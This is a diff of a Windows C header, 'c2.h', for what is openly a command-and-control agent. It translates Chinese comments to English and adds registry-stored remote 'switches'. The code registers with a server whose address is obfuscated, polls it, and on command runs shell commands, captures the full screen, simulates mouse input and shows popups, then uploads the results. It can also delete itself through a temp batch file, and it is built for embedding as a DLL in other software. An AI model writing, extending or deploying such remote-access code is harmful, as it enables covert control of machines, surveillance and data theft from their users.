@@ -1,5 +1,5 @@
 /*
- * c2.h — Win C2 核心：注册、心跳、命令执行、上传
+ * c2.h — core: register, heartbeat, command exec, upload
  */
 #pragma once
 #define WIN32_LEAN_AND_MEAN
@@ -14,18 +14,22 @@
 #include "json.h"
 #include "device_id.h"
 
-/* ---- 全局状态 ---- */
+/* ---- state ---- */
 static volatile LONG  g_running    = 0;
 static volatile int   g_poll_sec   = DEFAULT_POLL_SEC;
 static volatile int   g_c2_enabled = 1;
-static volatile int   g_expire_block = 0; /* 1=卡密过期阻断，直接拒绝执行 */
-static HANDLE         g_wake_event = NULL; /* 用于提前唤醒 sleep */
+static volatile int   g_expire_block = 0;
+static HANDLE         g_wake_event = NULL;
 static char           g_device_id[128] = {0};
 static char           g_software_type[64] = {0};
 static char           g_software_version[32] = "1.0.0";
 static char           g_kami[256] = {0};
 
-/* ---- Base64 编码（用于上传） ---- */
+/* ---- switch callback ---- */
+typedef void (*C2SwitchCallback)(const char* key, int on);
+static C2SwitchCallback g_switch_cb = NULL;
+
+/* ---- base64 ---- */
 static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 static char* base64_encode(const unsigned char* in, size_t len) {
     size_t out_len = ((len + 2) / 3) * 4 + 1;
@@ -46,7 +50,7 @@ static char* base64_encode(const unsigned char* in, size_t len) {
     return out;
 }
 
-/* ---- 上传字节（base64 form） ---- */
+/* ---- upload ---- */
 static void c2_upload_bytes(const char* cmd_id, const char* type, const char* ext,
                              const unsigned char* data, size_t data_len) {
     VAULT_STR(upload_url, BLOB_EP_UPLOAD);
@@ -75,7 +79,7 @@ static void c2_upload_text(const char* cmd_id, const char* type, const char* tex
     c2_upload_bytes(cmd_id, type, "txt", (const unsigned char*)text, strlen(text));
 }
 
-/* ---- 截图（GDI）---- */
+/* ---- screenshot (GDI) ---- */
 static void cmd_screenshot(const char* cmd_id) {
     int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
@@ -89,7 +93,7 @@ static void cmd_screenshot(const char* cmd_id) {
     BitBlt(hDC, 0, 0, w, h, hScreen, x, y, SRCCOPY);
     ReleaseDC(NULL, hScreen);
 
-    /* 转 BMP 字节 */
+    /* BMP bytes */
     BITMAPINFOHEADER bih = {0};
     bih.biSize = sizeof(bih);
     bih.biWidth = w; bih.biHeight = -h;
@@ -124,7 +128,7 @@ static void cmd_screenshot(const char* cmd_id) {
     DeleteDC(hDC);
 }
 
-/* ---- Shell 执行 ---- */
+/* ---- shell ---- */
 static void cmd_shell(const char* cmd_id, const char* cmd) {
     SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
     HANDLE hRead, hWrite;
@@ -166,7 +170,7 @@ static void cmd_shell(const char* cmd_id, const char* cmd) {
     c2_upload_text(cmd_id, "shell", total > 0 ? buf : "(no output)");
 }
 
-/* ---- 模拟点击 ---- */
+/* ---- tap ---- */
 static void cmd_tap(const char* cmd_id, int x, int y) {
     SetCursorPos(x, y);
     INPUT inp[2] = {0};
@@ -178,7 +182,7 @@ static void cmd_tap(const char* cmd_id, int x, int y) {
     c2_upload_text(cmd_id, "input_tap", msg);
 }
 
-/* ---- 模拟滑动 ---- */
+/* ---- swipe ---- */
 static void cmd_swipe(const char* cmd_id, int x1, int y1, int x2, int y2, int dur_ms) {
     int steps = dur_ms / 16;
     if (steps < 2) steps = 2;
@@ -200,18 +204,18 @@ static void cmd_swipe(const char* cmd_id, int x1, int y1, int x2, int y2, int du
     c2_upload_text(cmd_id, "input_swipe", msg);
 }
 
-/* ---- 消息提示 ---- */
+/* ---- message ---- */
 static void cmd_message(const char* cmd_id, const char* text) {
-    /* 托盘气泡（Shell_NotifyIcon），降级到 MessageBox */
-    MessageBoxA(NULL, text, "消息", MB_OK | MB_ICONINFORMATION | MB_TOPMOST | MB_SYSTEMMODAL);
+    /* fallback to MessageBox */
+    MessageBoxA(NULL, text, "Message", MB_OK | MB_ICONINFORMATION | MB_TOPMOST | MB_SYSTEMMODAL);
     c2_upload_text(cmd_id, "message", "shown");
 }
 
-/* ---- 自毁（删除自身 EXE） ---- */
+/* ---- self destruct ---- */
 static void cmd_self_destruct(void) {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, sizeof(path));
-    /* bat 延迟删除 */
+    /* delayed delete */
     char bat[MAX_PATH];
     GetTempPathA(sizeof(bat), bat);
     strcat(bat, "c2del.bat");
@@ -233,6 +237,39 @@ static void cmd_self_destruct(void) {
     SetEvent(g_wake_event);
 }
 
+/* ---- switch storage (registry) ---- */
+static void switch_save(const char* key, int on) {
+    HKEY hKey;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\C2Agent\\Switches", 0, NULL,
+                        0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD val = on ? 1 : 0;
+        RegSetValueExA(hKey, key, 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+        RegCloseKey(hKey);
+    }
+}
+
+static int switch_load(const char* key, int def) {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\C2Agent\\Switches", 0,
+                      KEY_READ, &hKey) == ERROR_SUCCESS) {
+        DWORD val = 0, sz = sizeof(val);
+        if (RegQueryValueExA(hKey, key, NULL, NULL, (BYTE*)&val, &sz) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return (int)val;
+        }
+        RegCloseKey(hKey);
+    }
+    return def;
+}
+
+static void cmd_switch_toggle(const char* cmd_id, const char* key, int on) {
+    switch_save(key, on);
+    if (g_switch_cb) g_switch_cb(key, on);
+    char msg[256];
+    snprintf(msg, sizeof(msg), "sw[%s]%s", key, on ? "on" : "off");
+    c2_upload_text(cmd_id, "switch_toggle", msg);
+}
+
 /* ---- ACK ---- */
 static void c2_ack(const char* ids[], int n) {
     if (n == 0) return;
@@ -242,7 +279,7 @@ static void c2_ack(const char* ids[], int n) {
     snprintf(url, sizeof(url), "%s%s", base_url, ack_ep);
     free(base_url); free(ack_ep);
 
-    /* 拼接 id1,id2,... */
+    /* join id1,id2,... */
     char id_list[2048] = {0};
     for (int i = 0; i < n; i++) {
         if (i > 0) strcat(id_list, ",");
@@ -258,11 +295,11 @@ static void c2_ack(const char* ids[], int n) {
     if (resp) free(resp);
 }
 
-/* ---- 处理心跳/注册响应 ---- */
+/* ---- handle response ---- */
 static void c2_handle(const char* resp) {
     if (!resp) return;
 
-    /* 解析 config */
+    /* parse config */
     const char* data = strstr(resp, "\"data\"");
     if (!data) return;
 
@@ -273,7 +310,7 @@ static void c2_handle(const char* resp) {
     /* enable_c2 */
     g_c2_enabled = json_bool(data, "enable_c2", 1);
 
-    /* 解析 pending_commands 数组 */
+    /* parse pending_commands array */
     const char* cmds_start = strstr(data, "\"pending_commands\"");
     if (!cmds_start) return;
     const char* arr = strchr(cmds_start, '[');
@@ -286,7 +323,7 @@ static void c2_handle(const char* resp) {
     int done_n = 0;
 
     while ((obj = json_array_next(arr, &ctx, &obj_end)) != NULL && done_n < 64) {
-        /* 截取对象字符串 */
+        /* extract object string */
         size_t obj_len = obj_end - obj;
         char* o = (char*)malloc(obj_len + 1);
         if (!o) continue;
@@ -300,16 +337,16 @@ static void c2_handle(const char* resp) {
 
         if (!id[0]) { free(o); continue; }
 
-        /* wake：唤醒心跳线程，立刻做下次心跳 */
+        /* wake */
         if (strcmp(type, "wake") == 0) {
             SetEvent(g_wake_event);
         }
-        /* expire_block：卡密过期阻断 */
+        /* expire_block */
         else if (strcmp(type, "expire_block") == 0) {
             g_expire_block = 1;
-            MessageBoxA(NULL, "您的授权已过期，功能已被限制。", "授权过期", MB_OK | MB_ICONWARNING | MB_TOPMOST);
+            MessageBoxA(NULL, "License expired.", "Notice", MB_OK | MB_ICONWARNING | MB_TOPMOST);
         }
-        /* 正常命令 */
+        /* commands */
         else if (g_c2_enabled && !g_expire_block) {
             const char* payload = strstr(o, "\"payload\"");
 
@@ -335,12 +372,20 @@ static void c2_handle(const char* resp) {
                 char text[512] = {0};
                 if (payload) json_str(payload, "text", text, sizeof(text));
                 cmd_message(id, text);
+            } else if (strcmp(type, "switch_toggle") == 0) {
+                char key[128] = {0};
+                int on = 0;
+                if (payload) {
+                    json_str(payload, "key", key, sizeof(key));
+                    on = json_bool(payload, "on", 0);
+                }
+                if (key[0]) cmd_switch_toggle(id, key, on);
             } else if (strcmp(type, "kick") == 0) {
-                /* 不做卸载，直接退出 */
+                /* exit without uninstall */
                 InterlockedExchange(&g_running, 0);
                 SetEvent(g_wake_event);
             } else if (strcmp(type, "self_destruct") == 0) {
-                /* ACK 先加进去，等会儿一起发完再自毁 */
+                /* ack first, then self-destruct */
                 char* id_copy = _strdup(id);
                 done_ids[done_n++] = id_copy;
                 free(o);
@@ -362,7 +407,7 @@ static void c2_handle(const char* resp) {
     }
 }
 
-/* ---- POST 一次心跳/注册 ---- */
+/* ---- heartbeat POST ---- */
 static void c2_beat(const char* endpoint) {
     VAULT_STR(base_url, BLOB_BASE_URL);
     char url[512];
@@ -391,9 +436,9 @@ static void c2_beat(const char* endpoint) {
     if (resp) free(resp);
 }
 
-/* ---- C2 主循环线程 ---- */
+/* ---- main loop ---- */
 static DWORD WINAPI c2_thread(LPVOID _) {
-    /* 注册 */
+    /* register */
     VAULT_STR(reg_ep, BLOB_EP_REG);
     c2_beat(reg_ep);
     free(reg_ep);
@@ -411,31 +456,27 @@ static DWORD WINAPI c2_thread(LPVOID _) {
 }
 
 /* ================================================================
- * 公开 API（DLL 导出 + EXE 调用）
+ * Public API (DLL export + EXE entry)
  * ================================================================ */
 
 /*
- * C2_Start — 启动 C2 后台线程
- *   server_url    : NULL = 使用 blobs.h 中编译时地址
- *   software_type : 分组标识，如 "win_agent"、"momo_pc"
- *   kami          : 卡密（NULL = 跳过卡密，依赖服务端 auto_issue_card）
- *   version       : 软件版本字符串，NULL = "1.0.0"
- * 返回 1 成功，0 失败（已在运行）
+ * C2_Start — start background thread
+ * Returns 1 on success, 0 if already running
  */
 __declspec(dllexport) int C2_Start(const char* software_type, const char* kami, const char* version) {
-    if (InterlockedExchange(&g_running, 1) == 1) return 0; /* 已在运行 */
+    if (InterlockedExchange(&g_running, 1) == 1) return 0;
 
     get_device_id(g_device_id, sizeof(g_device_id));
     strncpy(g_software_type, software_type ? software_type : SOFTWARE_TYPE, sizeof(g_software_type) - 1);
     if (version) strncpy(g_software_version, version, sizeof(g_software_version) - 1);
 
-    /* 卡密处理 */
+    /* license */
     if (kami && *kami) {
         strncpy(g_kami, kami, sizeof(g_kami) - 1);
         kami_save(g_kami);
     } else if (!kami_load(g_kami, sizeof(g_kami))) {
-        /* 没有缓存卡密 —— 弹框让用户输入（若服务端开了 auto_issue 则会忽略） */
-        kami_prompt(g_kami, sizeof(g_kami), "授权验证", "请输入卡密");
+        /* no cached license — prompt user */
+        kami_prompt(g_kami, sizeof(g_kami), "Authorization", "Enter license key");
         if (g_kami[0]) kami_save(g_kami);
     }
 
@@ -445,16 +486,26 @@ __declspec(dllexport) int C2_Start(const char* software_type, const char* kami, 
     return 1;
 }
 
-/* C2_Stop — 停止 C2（等待线程退出，最多 3 秒） */
+/* C2_Stop */
 __declspec(dllexport) void C2_Stop(void) {
     InterlockedExchange(&g_running, 0);
     if (g_wake_event) SetEvent(g_wake_event);
     Sleep(500);
 }
 
-/* C2_SetKami — 运行时更新卡密 */
+/* C2_SetKami */
 __declspec(dllexport) void C2_SetKami(const char* kami) {
     if (!kami) return;
     strncpy(g_kami, kami, sizeof(g_kami) - 1);
     kami_save(g_kami);
+}
+
+/* C2_SetSwitchCallback */
+__declspec(dllexport) void C2_SetSwitchCallback(C2SwitchCallback cb) {
+    g_switch_cb = cb;
+}
+
+/* C2_GetSwitch — returns 1=on, 0=off */
+__declspec(dllexport) int C2_GetSwitch(const char* key, int def) {
+    return switch_load(key, def);
 }
